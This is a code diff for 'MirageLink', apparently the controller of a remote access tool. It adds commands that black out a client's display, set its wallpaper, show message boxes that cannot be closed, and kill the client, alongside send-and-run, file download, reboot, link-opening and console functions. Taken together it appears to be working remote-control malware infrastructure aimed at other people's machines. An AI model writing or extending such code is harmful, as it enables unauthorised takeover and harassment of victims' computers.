@@ -14,17 +14,15 @@ from frames import (settings, build_config, collect_info,
 
 
 class Server(ctk.CTk):
-    def __init__(self, host, port, gui):
+    def __init__(self, host, port, key, gui):
         self.host = host 
         self.port = port  
         self.gui = gui  
+        self.key = key
         self.clients = []  
         self.running = False  
 
         self.msg_queue = queue.Queue()
-
-        self.data = load_settings()
-        self.key = self.data["key"]
 
     def start_server(self):
         self.running = True
@@ -59,7 +57,7 @@ class Server(ctk.CTk):
                     client_thread = threading.Thread(target=self.handle_client, args=(conn, addr), daemon=True)
                     client_thread.start()
         
-                    sound = pygame.mixer.Sound('sounds/plus.mp3').play()
+                    sound = pygame.mixer.Sound('server_fold/sounds/plus.mp3').play()
         except Exception as e:
             print(f"Server error: {e}")
         finally:
@@ -111,6 +109,11 @@ class Server(ctk.CTk):
                         print(f'Sended: {filepath}')
                         threading.Thread(target=self.send_file, args=(filepath, ip, port), daemon=True).start()
 
+                    elif 'set_wallpaper' in message:
+                        filepath = message[13:].strip()
+                        print(f'Sended wallpaper: {filepath}')
+                        threading.Thread(target=self.send_file, args=(filepath, ip, port), daemon=True).start()
+
                     elif 's_run' in message:
                         filepath = message[5:].strip()
                         print(f'Send and run: {filepath}')
@@ -122,6 +125,7 @@ class Server(ctk.CTk):
                         threading.Thread(target=self.download_file, args=('', ip, port), daemon=True).start()
                     
                     elif message == "remote":
+                        print("Remote Tool Activated")
                         self.remote = remote_tool.RemoteServer()
                     
                 except Exception as e:
@@ -208,13 +212,14 @@ class MirageApp(ctk.CTk):
         self.users = []
         self.user_frames = []
 
-        self.load = load_settings()
-        self.HOST, self.PORT = self.load['host'], self.load['port']
 
         create_key()
+        self.load = load_settings()
+        self.HOST, self.PORT = self.load['host'], self.load['port']
+        self.key = self.load["key"]
 
-        self.server = Server(self.HOST, self.PORT, self)
 
+        self.server = Server(self.HOST, self.PORT, self.key, self)
         server_thread = threading.Thread(target=self.server.start_server, daemon=True)
         server_thread.start()
 
@@ -299,6 +304,23 @@ class CommandFunction:
         else:
             threading.Thread(target=self.server.send_to_client, args=(ip, port, 'reboot'), daemon=True).start()
 
+    def display_controll(self, ip, port, on=False):
+        if on == False:
+            threading.Thread(target=self.server.send_to_client, args=(ip, port, 'display black'), daemon=True).start()
+        else:
+            threading.Thread(target=self.server.send_to_client, args=(ip, port, 'display white'), daemon=True).start()
+
+    def set_wallpaper(self, ip, port):
+        file_path = filedialog.askopenfilename(title="Select file")
+        if file_path:
+            threading.Thread(target=self.server.send_to_client, args=(ip, port, f'set_wallpaper {file_path}'), daemon=True).start()
+
+    def msg_box(self, ip, port, msg, no_close=False):
+        if no_close == False:
+            threading.Thread(target=self.server.send_to_client, args=(ip, port, f'msg {msg}'), daemon=True).start()
+        else:
+            threading.Thread(target=self.server.send_to_client, args=(ip, port, f'no_close_box {msg}'), daemon=True).start()
+
     def console(self, ip, port):
         self.console_app = console.ConsoleApp(ip, port, self.server)
 
@@ -314,9 +336,6 @@ class CommandFunction:
     def open_link(self, ip, port, link):
         threading.Thread(target=self.server.send_to_client, args=(ip, port, f'open_link {link}'), daemon=True).start()
 
-    def send_msg(self, msg):
-        messagebox.showinfo('MirageLink', msg)
-
     def send_and_run(self, ip, port):
         file_path = filedialog.askopenfilename(title="Select file")
         if file_path:
@@ -330,12 +349,27 @@ class CommandFunction:
     def download_file(self, ip, port, filename):
         threading.Thread(target=self.server.send_to_client, args=(ip, port, f'download {filename}'), daemon=True).start()
 
+    def killer(self, ip, port, kill=False):
+        data = messagebox.askyesno('MirageLink', 'You sure ???')
+        if data == True:
+            if kill == False:
+                threading.Thread(target=self.server.send_to_client, args=(ip, port, 'exit'), daemon=True).start()
+            threading.Thread(target=self.server.send_to_client, args=(ip, port, 'kill'), daemon=True).start()
+
     def post_msg(self, ip, port, msg):
         threading.Thread(target=self.server.send_to_client, args=(ip, port, msg), daemon=True).start()
 
+    def send_msg(self, msg):
+        data = messagebox.showinfo('MirageLink', msg)
+        return data
 
-if __name__ == "__main__":
+
+def main():
     pygame.init()
     pygame.mixer.init()
 
     app = MirageApp().mainloop()
+
+
+if __name__ == "__main__":
+    main()
